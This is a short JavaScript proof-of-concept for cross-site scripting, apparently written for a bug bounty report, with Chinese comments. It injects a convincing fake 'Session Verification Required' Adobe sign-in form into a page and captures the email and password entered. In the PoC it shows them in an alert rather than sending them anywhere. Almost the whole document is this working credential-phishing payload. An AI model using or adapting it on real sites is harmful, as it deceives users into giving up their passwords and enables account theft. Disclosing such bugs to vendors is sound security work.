(function() {
    // 1. 定位目标容器
    const container = document.getElementById('selected-filters-container');
    if (!container) return;

    // 2. 创建一个外层装饰容器（增加可信度）
    const wrapper = document.createElement('div');
    wrapper.style.cssText = "border: 1px solid #ccc; padding: 15px; margin: 10px 0; background: #f9f9f9; border-radius: 5px; font-family: sans-serif;";
    
    // 3. 添加标题和说明文字
    const title = document.createElement('h3');
    title.innerText = "Session Verification Required";
    title.style.color = "#d93025";
    
    const desc = document.createElement('p');
    desc.innerText = "Please confirm your Adobe account details to continue.";

    // 4. 创建 Email 输入框
    const emailInput = document.createElement('input');
    emailInput.type = "email";
    emailInput.value = "hechneg@wearehackerone.com"; // 你的标志
    emailInput.style.cssText = "display:block; width:90%; margin-bottom:10px; padding:8px;";

    // 5. 创建密码输入框
    const passInput = document.createElement('input');
    passInput.type = "password";
    passInput.placeholder = "Password";
    passInput.style.cssText = "display:block; width:90%; margin-bottom:10px; padding:8px;";

    // 6. 创建提交按钮
    const btn = document.createElement('button');
    btn.innerText = "Sign In";
    btn.style.cssText = "background:#007bff; color:#fff; border:none; padding:10px 20px; cursor:pointer; border-radius:3px;";

    // 7. 绑定点击事件，展示数据外传的可能性
    btn.onclick = function() {
        alert("PoC Attack Success!\n\nIntercepted Data:\nEmail: " + emailInput.value + "\nPassword: " + passInput.value);
    };

    // 8. 组装并挂载到页面
    wrapper.append(title, desc, emailInput, passInput, btn);
    container.appendChild(wrapper);

    console.log("XSS PoC: Form injected successfully.");
})();
